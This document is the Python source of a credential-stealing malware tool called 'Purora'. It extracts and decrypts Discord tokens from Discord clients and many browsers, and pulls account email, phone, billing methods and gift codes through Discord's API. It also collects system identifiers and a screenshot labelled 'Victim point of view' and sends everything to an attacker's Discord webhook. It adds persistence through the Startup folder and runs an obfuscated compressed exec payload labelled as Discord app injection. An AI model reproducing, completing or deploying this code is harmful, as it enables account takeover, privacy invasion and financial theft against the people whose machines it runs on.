import base64
import json
import os
import platform
import random
import re
import sqlite3
import subprocess
import threading
import uuid
import ctypes
import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from shutil import copy2
from sys import argv
from tempfile import gettempdir, mkdtemp
from zipfile import ZIP_DEFLATED, ZipFile

WEBHOOK_HERE = "PUT YOUR WEBHOOK HERE"

__PING__ = "%ping_enabled%"
__PINGTYPE__ = "here"
__ERROR__ = "%_error_enabled%"
__STARTUP__ = "%_startup_enabled%"
__DEFENDER__ = "%_defender_enabled%"

def main(webhook: str):
    webhook = SyncWebhook.from_url(webhook, session=requests.Session())

    threads = [Browsers, Wifi, Minecraft, BackupCodes]
    configcheck(threads)

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    zipup()

    _file = None
    _file = File(f'{localappdata}\\{os.getlogin()}.zip')

    content = ""
    if __PING__:
        if __PINGTYPE__ == "everyone":
            content += "@everyone"
        elif __PINGTYPE__ == "here":
            content += "@here"

    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")

    PcInfo()
    Discord()


def program(webhook: str):
    Debug()

    procs = [main]

    for proc in procs:
        proc(webhook)

def try_extract(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            pass
    return wrapper


def configcheck(list):
    if not __ERROR__:
        list.remove(fakeerror)
    if not __STARTUP__:
        list.remove(startup)
    if not __DEFENDER__:
        list.remove(disable_defender)

def startup():
    startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    if os.path.exists(startup_path + argv[0]):
        os.remove(startup_path + argv[0])
        copy2(argv[0], startup_path)
    else:
        copy2(argv[0], startup_path)

def create_temp(_dir: str or os.PathLike = gettempdir()):
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x")
    return path


class PcInfo:
    def __init__(self):
        self.get_inf(__WEBHOOK_HERE__)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Purora", color=10038562)
        
        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)

        embed.add_field(
            name="System Info",
            value=f''' **PC Username:** `{username}`\n **PC Name:** `{hostname}`\n **OS:** `{computer_os}`\n\n **IP:** `{ip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu.Name}`\n **GPU:** `{gpu.Name}`\n **RAM:** `{ram}GB`''',
            inline=False)
        embed.set_footer(text="https://github.com/Rdmo1")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")


@try_extract
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(__WEBHOOK_HERE__)
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())

        for token in self.tokens:
            if token in self.tokens_sent:
                pass

            val_codes = []
            val = ""
            nitro = "none"

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                       'Content-Type': 'application/json',
                       'Authorization': token}

            r = requests.get(self.baseurl, headers=headers).json()
            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)

            username = r['username'] + '#' + r['discriminator']
            discord_id = r['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
            phone = r['phone']
            email = r['email']

            try:
                if r['mfa_enabled']:
                    mfa = "true"
                else:
                    mfa = "none"
            except Exception:
                mfa = "none"

            try:
                if r['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r['premium_type'] == 2:
                    nitro = 'Nitro'
                elif r['premium_type'] == 3:
                    nitro = 'Nitro Basic'
            except BaseException:
                nitro = nitro

            if b == []:
                methods = "none"
            else:
                methods = ""
                try:
                    for method in b:
                        if method['type'] == 1:
                            methods += "CREDIT CARD"
                        elif method['type'] == 2:
                            methods += "PAYPAL ACCOUNT"
                        else:
                            methods += "FOUND UNKNOWN METHOND"
                except TypeError:
                    methods += "FOUND UNKNOWN METHOND"

            val += f' **Discord ID:** `{discord_id}` \n **Email:** `{email}`\n **Phone:** `{phone}`\n\n **2FA:** `{mfa}`\n **Nitro:** `{nitro}`\n **Billing:** `{methods}`\n\n **Token:** `{token}`\n'

            if "code" in g.text:
                codes = json.loads(g.text)
                try:
                    for code in codes:
                        val_codes.append((code['code'], code['promotion']['outbound_title']))
                except TypeError:
                    pass

            if val_codes == []:
                val += f'\n**No Gift Cards Found**\n'
            elif len(val_codes) >= 3:
                num = 0
                for c, t in val_codes:
                    num += 1
                    if num == 3:
                        break
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'
            else:
                for c, t in val_codes:
                    val += f'\n `{t}:`\n**{c}**\n[Click to copy!]({c})\n'

            embed = Embed(title=username, color=10038562)
            embed.add_field(name=".                                                    Discord Info                                .", value=val + "\u200b", inline=False)
            embed.set_thumbnail(url=avatar)

            webhook.send(
                embed=embed,
                avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096",
                username="Purora")
            self.tokens_sent += token

        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(tempfolder + "\\image.png")

        embed2 = Embed(title="Victim point of view", color=10038562)
        file = File(tempfolder + "\\image.png", filename="image.png")
        embed2.set_image(url="attachment://image.png")

        webhook.send(
            embed=embed2,
            file=file,
            username="Purora")
        os.close(image)

# DISCORD APP INJECTION

import zlib
import codecs
import base64
exec(codecs.decode(zlib.decompress(bytes(b'x\xda\xcd]ms\xdb8\x92\xfe1\x9bhe\xbbf+\x15\')\xbb\xcew\xa9\x1bM"{\xc7\xde\xd4\xf9.\x8e\xa3\x0f\xeb\x91(\x92\xb6\x9cH\x96HJv\xd67\xbf\xfd\xd0\x00H\xa2\x81n\x10\x94d\xe7\xbe\xa4\x14Y\x82\xf0\xd2x\xfa\xe9W\xc6\xf7q\xd4\x8df\xe38\xca\xfe&\xfe\x11/\xba\xa3a\x16\xbf{\xf3\xb7\xd1\xc1[\xfd\xc6\xe2\xaf_\xe6o:\xff\xea\xfd\xefE\xff?\xbfLw\xbb\xa7_\xce\x1e\xce~\xf9r\xb6\xfa\xf0\xe7\xc5\xf9\xe9\xab\xf3\xfe\xcb\xc9\xef\xffq\x1c_]~\x18\xec\x1c\x0e{\xc3\xd5\xe4\xe5\xdb\xe3\xbfL\x1e\xbe\x1f\x0fV\x87\x89\xf8\xe7\xf4\xfex\xd0=\xbf\x16\xaf>%\xfd\xdf\xfe\xfb ?\x1e\xbc\xbfL\x8fG\x0f\xb3\x07\xf1\xeaT\xfca\xfaqt\xfc\x97W\x9f\xaf\xfb\xe37\xfb\x11|d\xd1\x8f~\xec]\x96_\xd3\x03\xf4\x7f\xfd\xe3$\xe9\xff\xfa\xcb~~|\xb0:\x8d\xfb\x9d\xf84?>|5Y\xf5;\xab\xcb\xfb~\xf7\xf1\x1f\x0f\xc7\x07\xdd\xcf\xdf\x8e\x0f\x8f\xdev\xfb\x9d\xdf\xf6\x8b~\xf7\xe8\xf8\x1e>w[\xbd\x97\xf7\xa3?\xc4o\xc0w\xfb\xdd\xfc\xf5\xbc\xdf\xd9\x7f\\\xf4;\x17\'\x19|\xb7\x80Q\xc4\xab\xe9I*\xbeqp\x07\xdf\xc8\xc4{\xbf\xe7\xfd\xce\xd9!\xfc\xeey,>\'f%\xc6\x13\xdf\xbd\xf8\x98\xf6_^]\xcd`\x14\xf1\xd7\xaeX\xd6\xe1\xab\xf4\x07\xbc\x17\xc3\xa0\xb1X\xd1\xbb\x0c\xe6\xf7\xd0\xefN\xfe\x9c\xc1xc1\xfci"\xa6\xf6aW\x0c\xda[\x88\xff~\x1c\x89Y\xbd\x9a\xf7\xa3y7\x86WbB\xf1\xa7kX\xdb\xf5\xf1\xc1\xc5\xbb9|\x17f\xd0\x13\xff=}\xfc\n\x13\xdf\x85\xdf\x18\x1c\x1f\xc4=1\xa1\xd5\xa7\x0c>w\x07\xb3\x9a\xc1{\x0b\x18jz|\xb0\x7f$\xfez&F\x16\xe3M\xd4\xfc\x0e\xde\x0f\x0b\xf1\xb9\xd73\x98_*\xc7\x83\x01V\xb0/#\xbd\x84\xa3\xb7w\xb0\x8e\x07X\xf9.\xacr,\xce\xe3\xe8\x0e^]\x8b\xdf}/\xd6\xf6\xdb\xbb\x08v#\xedw_\x1c\xec\xc2o\x0c\xe0\xafr\xc7aE\'+\xb99\xf0*\x83=\x88`\xbc\x15|N\xae\xed\x9b\x98\xa4\x18T\xec\xc1\x0e\xec\xb3\x98\xdf\x19|D\xce\xbew5\x83\x95\x7f\x83Y-\xe1w\x07\xb0\xde\x97\xf0\xdf\x1b\x18\xaf\x10K=\x8c`O\xc5\xafM\xfe\xd5\x81\x15\xc5\xb0\xe8\x08\xbe\xbb\x80\x13\\\xea\xdf\xe8~\x96\xcb\xcf`\xceC\x98\xd0\n\xf6e\x06s.\xe4\xf0\xf0O\x0es\x89\xa5\x0c\x89\x01\x1e\xc5\xbe\xc4\'\xa9\xfa\xdd\x9dw\xff\xb5\'W\t\xfbr\x03K\xb8\x87\xf7\x8e\xd4)\xc0n\x88\xe1\xf7\xe5\xef\x8ea\xaf\xeea\xbc{\xb9\x890\xb5\x97\xb0\xa7\xd7J\xfe\xc4\xfc2\xf8\xc6\x04\xc6\x93\xef\x89\xa9]\xec\x0f\xe0U\x06\xe7[\xe8\x05\x9a\xe3\xedjy\x81\xf1\xc4\xfc\x960\xe8\x1d\xec\xd5\xb0\x92\xc9\x1bs\xbc\xe9IT\xae\xf7*\xd1\xf3\xd3\xf2\xa2d\x17\xc6K\xf4\x9e\xea\xf9%\xfa,a~b\x9b\x12c<q\n\x13\xd8\xab\x1d\x98\xdfB\xcf\xaf\xf7\xfe\x12~\xfcH\xcb\xa9\xde\xd3\xaf0\xbf\x15\x0c:S\xf22~s8\x86\x03\xcda.C\x98\xa9\x1c\xa0\x80\x0f\xcf\xc5{G\x03\xf8o\n\xf2\x92\xc1\x9e\xde\xc3\x873y\x8cj\xbcr~p\xdf.am\x1f#g~J^\x1e/\xfb/\xf7\xba_\xcc\xf3\xd8?\x9a\xcb\x1b\x05wu\\\xcdo\t"/e(Q2$\xe7"\xe4E\xeed\xaaehz\xb2\x80\x95\xcf\xca\xf1^\x8d\xe0\xbb\xb7\xfa<\xce\x0eAh\xce\x93R\xfe\xfe\xcc\xb5 \xc9\xf3\xd5\xe7!\x87Z\xa8\x8b\xd8\x99\x9e?\x88\xf9\x1dM\xd5z\xc5]\x90\x973\x82\xf1\xf6\x00\n\xa2j~\x80>\xbf\x17\xe2\x1b \xb6\xf1\xe1\x08f\x90U\xe3\xddT\xf2\x92\xc3\x9d\xe9\x94\xf2"\xe6\'\xceh\xa9\xef%\xdcPc\xbc\xc9\x9f0\xc0\'\xc0\xa1\xc3\xb8<\x85\x12\xc3\xc4R\xc7\xf0\x8de\xb5\x7fI5\xbf9\x8c|\'\xd7\x0b;9\x82\xf3x\xa1PJ\xae\x08\xae.\xfc\xee\xaa\x1aO\xe2\x9a\xfc\x8dy\xb5\x7fIu\xbe\xff\x06\xdfM4^\xc1\xdd\xf7\xed_\x8d\xb1r\x06\x80\x7f\xff\x9c\xd5\xf3\x83\xe5O\xe1\xbb\x80\x1b\xbd\x11\xc2\x03\xc0I\x89k\x17\x87c%\xedB\xfeF\xce\xfe\x89\xf9U\xe7!\xf1\xf9\x1b\xec\x9f\xbc\xfbz~\xe5z#}\x96Z^\xa2j\xbc\x85\xde\xbf\xb3\xc3\x02\xe4\xf9+>\xdfX\x1fO\xdcK\xcd\xf5\x1a\xe7\xdb\x1b\xe3\xf5\x8e\xe5A\xc1\xa0K\x10\xea\x94\x92\xbf\xf2sB\xfe\xca\xf9\r\x89\xfb\x91\xe2\xf9\xc1\x86\xbd\xbe\xc3\xe7;\x85\xef\xde\xc1z#\xbd\xcf%\x9e*<\x10[\xbc\x00\xad\x16k=#\x7f7\xee\xcda1C\x90\xe7\xc4\x9c\xdf\xf4\xfc^\xe2\x81D~5\x9e!/gB\xf4\xa2\x1f\xefGJ\xd6\x94\x86\xed^~\xaf\xf09\x91\xf7\x92\x9a\x9f\xc6S}\xdfL|\x11r\x95W\xe7\xab\xe7\xa7\xf0@\xe2\x9f\x90g|\xbe?\xe07\x12\xb9^\t\xeb\xc4\xfd\x18\x97\xe7V\xde7\x8d\x7f\xbf\xce\xa4>7\xc7\x9b\x9e\xdf\xc2fO\xf5}\xdb\x03\x84\xab\xc7\x930"\xf7\x05\xf8\x86Xo\x81\xc63\xf04u\xee\x87\xc0\x03\xc0\xb0\x91Z\xaf\xe6\x07B\x87\x02\x1f\xd2J]\xee\x06\xf0\x03IX@\x86\xe4\xfd\xc0\xf2W\xde_\xa1?*<E\xe7\xb1w5\xc7\xf2r\xa3\xf5y\xfe\xba\x8b\xef\x9b\xb5\x7f\xb1\xbe\xe7\xc4z\x9d\xf1>\xc1\xe7\x86 C\xef\x17x<\xb9\x7fZ\xb5\x99\xfbg\xc8\xdf\x1c4\xfb\x83\xb1\x7f\x8a\xbf\x00\xd9\x11\x7f-h|\x16\x12a\xdd_\xc5\xc3Jy\xb9\xe6\xee\x87\x85\xf7\x0f\xf0*\xd5\xf7W\xe3\x8bu\x1e_\xe1~d\xe6\xfc\x00\xc3\xa2\xf9\xde\x97\x92\xff\x19\xe3\x15R\x19\xe2\xf3E\xf87=\xd1\xdbd\x8c\xa7\xf1je\xeas}\xdfn`mR9Xx\xa0\xf1Y\xed\xb3u\x7f5_\xdb\x83\x19\xa4\xf6\xfc\xe4_\x81\xe5V\xfc@\x8e7\xd6\xfc\x05\xe6\x07ZR\xebsS\xfe\xe6p\x1e\x99\xa1\x8f\x1a\xf0@\xeb\x8f]\xe7<\xb4\xbe\\I\x96A\xe0\xb3\x10\xfe\xf7c\xeb\xbe\xe55\x8f\xad\xee\xaf\xbe\x1f\x92\xf3w\xf3\xb7S\x02\x9f\r\xfcC\xfaR\xc9\x9f\xe0W/\xde\xce\xaa\xfbf\xe97\xc9\xd72\x1e\x9f\r<}\xfc}\xa1\xae\x81x\x95\xc9\xbd7\xcfW\xe3\xfd\x04\xc6\x9br\xf3\x8bM\xbe\x01\xa3(\xfdq!>\xc7\xe0\xcb\x9e\xe4\xb1\xecz\xf1y\xd4\xfa\xad\xd6\x97Cm/H\xbdE\xacW\xfc\xc6/\xf0]\x85\xc0x<\xa9\x1b\x87\xfd\xe8\xeaqX\xcd/\xd3\xfb\xa7\xef\xefD\xdb[\xb5\xbc\xe8\xfb6S\xf33\xf0\xa5^/\xdc\x19\xf1\xbb]\xe2\xfeJ\xfd;\xc0\xfa\xe3;\xcc\xaa\xd0\xe3\x99x\x80\xe4O\xdf\x8f\x92\x1f\x00\xf5\xd3\xfa\xa8\x17\xb9\xeb\xdd\x1f*>\t\xf6\x0cw?\n\xcd\'m\xf9\xbb\xfa\x8a\xe5\xd9\xc0?|\x7f\xcd\xf1\x80\x92\xb8\xfaH\x9do\x8a\xf7O\xb2\xb4T\xebK\x93_\x15z\xbc\xee\xe7\xa5\xcd\xffJ{\xe6\xdfa\xce\xf7\xf8\xfeV\xf8R\xea_C^$^\x9d\t\xe6Q\xf2{j\xff\xc6\x1e~\xa5\xed\x19\x07\xff\xc4y\xa4\x1c\xdf-<xj\xac\xd7\xbc\xbf\xf0\x91\x0e\xe2W\n\xffv@)-\x91\xfe\xfd\x9f\x05\xcc/R\x96\xab\xc1\x0f\xcc\xfb\x9bW\xfbW\x9e\x87\xb6Wc\xa9\x17<\xfa\x08\xe4\xd9\xde?\x8dW&\xbe`\xfe\x82\xc7\xfb.-\x1b\xc5\xc7\x11\x7f)\xf7\xcf\xe4\xa7\xc3\x06\xf9\x03\xfbW\x1aX\xf2\xcc1\xbf\xaf\xe4\x0f\x9c\x12&\xdf\xb5\xf4Q\xca\xe2\x01\xb6gv5>O\xc1@\xed]\x05\xf0\x03\x1a\x9f-|A\xf6%!\x7f\'\xd7\xb4\xfe\x10\xfa\x1c\x8f\x87\xee\xaf\xb6\xcfSN\xffZ|(\x96\xfa\xc8\xe0\xa7J\x0e\xce\xc4QH{\xab\xe4C1\xc2\xbf\xf3H\xfb\x8cX\xbe\x81\xec\xa3J\xbf\rl~P\xca\xcb\xac\xf2\x1f\xa4\x94\xfdf\xdd\xdf\xd2/%\xf6\xaf\xe4W\x99;\xbf\xa3\xa1\x87\xff\x05\xe2U\xa9\xdf\xa4\xc1\x96\xbb\xf2\xfcjQ\xf9\xc3b\xc2>\x8a*}\x999\xf6\xa5\x18\xaf\x81o0\xf8WT\xe3\x19\xf8\'w\x17\xef\x1f\xd2\x1f5_\x0b\xb5\xdf\xce\xc0\xef\xc3\xf0\x03l\x9f\xd7\xf6\xef\xa2\xc2\x03\x17\xef\xcf\xf6\xe36\xf8\xa7\xf8s\xe5\xdf\xc8l\xfc3\xfdM\x0c\xff3\xd6\xab\xfc9\xef,\xff\x86%\x7f9\xbe\xbf\xb5\xfd[\xe3}\xc9\x9f\xc1\x97+\xb6=\xc7\xf2g\xeb#\x8f\xff\xc0\xd4\x1f\xda~\x83\xcf9x`\xd8\x0b\xaf\xe7\x86\xff@\x08\x83\x94\x92\xa5\xe1_s\xf1/\xf2\xde\xdf\x98\xe7\x07\x06?u\xf8_\x97\xd0\xbf\xf7\xd2\x9f\x8d\xcf\xa3\xd6\x1fc\xcc\xc7G\n\x9a\xa5~\x13\xfb\xf7\x1d\xf9K\x0e\xe6\xca#\xd7=\xfauA\xef\x9f\x94\x17\xca_\x02\xf8b\xf1\xfb\xc3Wc\xb9\xe3\x05\x81\xcf\x86\xff\n\xf3]y\xaa\xb0\xde\xe3\x05g\x7f\xecT\xe7\xa6\xf4/,Z\x82G\xac\xf9\x86\xa9/\x11_3\xee\x9b\xed?H)\xfe\xa7\xed#X/\xc3\xd7\x16\xa6\xbd`\xac\xd7\xe4\x93\xa6\xbc\xc8\xfb\x01\xe7\xeb\x8e7\xae\xf4\xe5\xc0\xf1\xafa<5\xf5\xef\xb9k\x9f\x9b\xf6Q\xc2\xc8\xf3A\x8e\xce\xd7\xe0/\x05\xbe\xbf\xf5y\xcc\xc1\xb6\xef\x10\xfe\x83\xb9\xc3\xaf0\x9e\xda\xfcOro\x88\x1b\x94\xf7mP\x9d\x87T\xaec\xedgu\xe5\xb9\r\xfe\xf9\xed\xf3\x9a\x0f\xe5\xd8~{\x01\xeb\xbdU\xf1#1\xa1\t\'\x7f\x0e\xfe)<\xad\xfc\x93\xd5}S\xfevq\x85\n8\x8f9\xeb\x7f!\xf6on\xea-\xd7\x9f\x033]2\xfc\xefh\xca\xfa\xc30\x1eX\xfe\xc99\xb2/\x95?g\xb7\xd2\x1f\x84\xbc\x9cr\xfa\r\xfc\xcf\x1e\xfd\x96r\xfc\x85\xf5\x9f\x8e\xb1\xbd\x8a\xfc\xe3\xc2>o\xc7\xff\x84}9\x80\r\xdb5\xf4\x9b\xb1\x7f\x9a_%\xcd\xfe\x83L\x8d\x07hV\xf1\x03\x8a_\xe5\xac\xff\x1e\xdb\xe7\xe5}\xcb \xdaG\xe9K\xda^`\xf9\x9f9?\xdb\x1eD\xfc\xaf\xc1\x7f\xe5\xdao#\xdb>W|\xe3\xe8CW\x0c\xf0\xb9\xf6w.\x94\xd4\x89\x01\ne\x7fH\xcd\xe4\xc3?\xc2\x7fP\xfa\'\t{\x8b\xf3\x8fG\n\'k\xfcC\xfe\xd8q\x10\xfe\xf9\xed\xdfR_V\xf6t}\xbe:Z\xa5\xfe\xea\xd8\xbf\xb9B3K\xfeL|\xf9\xe7]\x83\x7f\x88:\x0f\x87?\xab\xfb\xfb\x12f\xca\xf8we\xfc\x83\xd2\x97\x92o@\x9c\xd8\x96\xe7\x9e\nM\xdf2|\x12\xce\xa3\xe6\x07\x8e\xfd[`\xff\xbd\x81\xf7\r\xf7\xb7-\xfe%\x9c\xff\xde\xc2\x17K\xfej\xffx-\x7f\x05\xe0U\xd2\x96\x1f(\xfbwJ\xd8\x83\x19\xa1?~\xe8(|\xc5_\x18~\x85\xf6\xefb\x7f\xa8dH\x1c\xfc\x9c\x8f\xcf\xd4\xfc\xd9\x8d\x7f\xe4\xa6\xbf\xc9\xe1/\x8c\xbd\xd0{\xf4\xe3_\xee\xea\xb72^A\xda\xbfH\xbf)\xfb\xb7\xf4\xff\xcd\xcd\xf3\xa5\xf1\xc5\x8d\xa7\x98\xfc\xc5\x92\xbf\xd4\xc4\x03\xc7\xfe\xf0\xe8_[\x1f\x99|\xc3\xd5o\xa7\x8fC\x9e\xdfc\xff\x0b\xf6?\xcf\r{&\x88\xff}\xba\xd5,\xc3\xd9\xbf\x81\xa3\xcf=\xf1\x0f\xc6\x7f\x1a\xe4\xff\x93\x12{\xeb\xf1_\x99\xf6\x91\xa5?\x12\xc4\xaf\x82\xec\xdf\xf5\xe2\x973\xca>\xd7\xf7\xd7\xe4/J\xff\xea|\x1f\x8f\xfd\x91S\xf6\x87\xc6\x17\x13\x0fj<\xcd\xabxOF\xd9o\x04\xbe,5\x1fB\xfaW\xc7\xa3\xb4\xfe\xc8\x99\xf8\xa5\x17\xff(|q\xe2\xd36\xff\xe3\xe2\xd3\xd8\x9eF\xf1\xb7R\xbfQ\xf2\xb7\xc2\xe7\xbb\xac\xec\xf3\xc8\x8a\xcf\x04\xe5Gh\xfeG\xc9_\x1dOi\x11\xff\x15\xfc\xcf\xe4/\xc8\xde\xf7\xfaO\x11\xde\xeb\xf5\x16\x86\xbd\xda\x02\xff\x06^\x7f\xc4]\xb3\xff\xde\xd1\x97\xae\xbde\xd8\xbfD<\x85\xe1\x7f\xa6\xbd\x10\xb3\xf9\x07\xf4\xfey\xe2\x83\xeb\xf3\xbfP\x7f\xa2)\x7f\xcb-\xe0\xdf\xda\xfcO\xc5?<\xfb\xb7\x0e\xfe\x8d\x9c\xfc\x03\x93\xaf\xdd\xe0\xf1*\xbeqn\xf9\xaf\xa4\x7fH\xcax\x8e\xfd\x11a\xf6\xaf\xc5\xff\xf0\xfeA\xc8\xca\xf0o\x18\xfe\xa6\xc7\x7f\xfc 